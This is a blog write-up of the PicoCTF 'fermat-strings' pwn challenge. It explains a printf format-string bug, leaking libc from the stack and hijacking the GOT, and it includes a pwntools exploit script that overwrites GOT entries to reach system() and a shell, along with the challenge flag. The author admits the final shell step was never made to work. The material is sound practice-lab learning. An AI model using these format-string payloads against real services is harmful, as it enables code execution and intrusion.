---
title: PicoCTF - fermat-strings
tags: [PicoCTF, CTF, PWN]

category: "Security Practice｜PicoCTF｜PWN"
date: 2024-01-31
---

# PicoCTF - fermat-strings
<!-- more -->

## Background
[C 庫函數 - strcspn()](https://www.runoob.com/cprogramming/c-function-strcspn.html)
> 該函數返回 str1 開頭連續都不含字符串 str2 中字符的字符數。

[atoi() - C語言庫函數](http://tw.gitbook.net/c_standard_library/c_function_atoi.html)
> 這個函數返回一個int值轉換的整數。如果冇有有效的轉換可以執行，它返回零。

[C 库函数 - snprintf()](https://www.runoob.com/cprogramming/c-function-snprintf.html)
> snprintf() 函數的返回值是輸出到 str 緩沖區中的字符數，不包括字符串結尾的空字符 \0。如果 snprintf() 輸出的字符數超過了 size 參數指定的緩沖區大小，則輸出的結果會被截斷，只有 size - 1 個字符被寫入緩沖區，最後一個字符為字符串結尾的空字符 \0。
>
>需要注意的是，snprintf() 函數返回的字符數並不包括字符串結尾的空字符 \0，因此如果需要將輸出結果作為一個字符串使用，則需要在緩沖區的末尾添加一個空字符 \0。


[Format Specifiers in C](https://www.geeksforgeeks.org/format-specifiers-in-c/)

## Source code
:::spoiler
```cpp!
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <math.h>

#define SIZE 0x100

int main(void)
{
  char A[SIZE];
  char B[SIZE];

  int a = 0;
  int b = 0;

  puts("Welcome to Fermat\\'s Last Theorem as a service");

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  printf("A: ");
  read(0, A, SIZE);
  printf("B: ");
  read(0, B, SIZE);

  A[strcspn(A, "\n")] = 0;
  B[strcspn(B, "\n")] = 0;

  a = atoi(A);
  b = atoi(B);

  if(a == 0 || b == 0) {
    puts("Error: could not parse numbers!");
    return 1;
  }

  char buffer[SIZE];
  snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B);
  printf(buffer);

  int answer = -1;
  for(int i = 0; i < 100; i++) {
    if(pow(a, 3) + pow(b, 3) == pow(i, 3)) {
      answer = i;
    }
  }

  if(answer != -1) printf("Found the answer: %d\n", answer);
}
```
:::

## Recon
這一題太難了，可以參考的資料太少了，大部分都有一些缺失，而且重點是server那邊的版本和local端不一樣就會造成got hijack失敗，所以最後沒有做出來，但是流程還是可以記錄一下
1. 先leak stack的資訊，例如`__libc_start_main`的address，然後到[^libc_database_search]查詢，光這一點耗費蠻多心力，雖然說只要查看stack上相對的位置，就可以leak出對應的address，但有可能是因為我local端libc version是2.35，所以找不到對應位置上libc address在database上的資料，但在server端卻找得到，這可能是不同版本的鍋，所以之後要找這種libc version的問題，最好是在2.31的地方
2. 得到libc的version後，就可以算offset，得出libc base address，然後就可以得出system在libc的確切位址，又由於這隻程式只會執行一次就結束，所以我們要讓他有loop的效果，作法就是got hijack，改掉pow的got位置為main function的address
註：為甚麼是改pow而不是atoi, snprintf之類的function的got?因為pow是比較後面被呼叫到的function，如果修改那些太早被呼叫到的function就馬上從main開始執行，這樣就沒辦法開shell了
3. 接著我們可以再從第二次的input中開shell，這就是最後做不出來的地方，除了之前沒有寫過相關的題目不知道怎麼開以外，其他WP[^fermat-strings][^picoMini-by-redpwn][^picoMini-by-redpwn-2021-Darin's-Challenges]也都會有其他的問題

## Exploit
```python!
from pwn import *
exe = ELF("chall")
libc = ELF("./libc6_2.31-0ubuntu9.1_amd64.so")

context.binary = exe
context.terminal = "kitty"

offset___libc_start_main_ret = 0x026fc0
offset_system = 0x0000000000055410
# offset___libc_start_main_ret_local = 0xac0b3c2270
# offset_system_local = 0x050d60

r = remote("mars.picoctf.net", 31929)
# r = process('./chall')

'''#############
leak libc address
#############'''
payload1 = b'1 %2082c%12$hn  ' + p64(exe.got['pow'])
payload2 = b'2 %109$p'
r.recvuntil(b'A: ')
r.sendline(payload1)
r.recvuntil(b'B: ')
r.sendline(payload2)
print(r.recvuntil(b" 2 0x"))
return_value = int(r.recv(12).strip(), 16)
libc_addr = return_value - 243 - offset___libc_start_main_ret
success(f"Return Value = {hex(return_value)}")
success(f"libc address = {hex(libc_addr)}")
success(f"libc system address = {hex(libc_addr + offset_system)}")
# success(f"libc system address = {hex(libc_addr + offset_system_local)}")
# success(f"libc address = {hex(libc_addr - offset___libc_start_main_ret_local)}")


'''#############
Get Shell
#############'''
# raw_input()
third = (libc.sym['system']>>16)&0xff
bottom = libc.sym['system'] & 0xffff
first = third - 21
second = bottom - third

payload1 = f'1 %{first}c%43$hhn%{second}c%44$hn'
payload2 = b'2'.ljust(8, b' ') + p64(exe.got['atoi']+2) + p64(exe.got['atoi'])
r.recvuntil(b'A: ')
r.sendline(payload1)
r.recvuntil(b'B: ')
r.sendline(payload2)

r.interactive()
```

Flag: `picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}`

## Reference
[^fermat-strings]:[fermat-strings](https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF_redpwn/fermat-strings.md)
[^picoMini-by-redpwn]:[picoMini by redpwn](https://heinen.dev/picoctf-2021-redpwn/#fermat-strings)
[^picoMini-by-redpwn-2021-Darin's-Challenges]:[picoMini by redpwn 2021 - Darin's Challenges](https://activities.tjhsst.edu/csc/writeups/picomini-redpwn-darin#fermat-strings-pwn)
[^libc_database_search]:[libc database search](https://libc.blukat.me/?q=__libc_start_main_ret%3A0x7fa8cf54d0b3&l=libc6_2.31-0ubuntu9.1_amd64)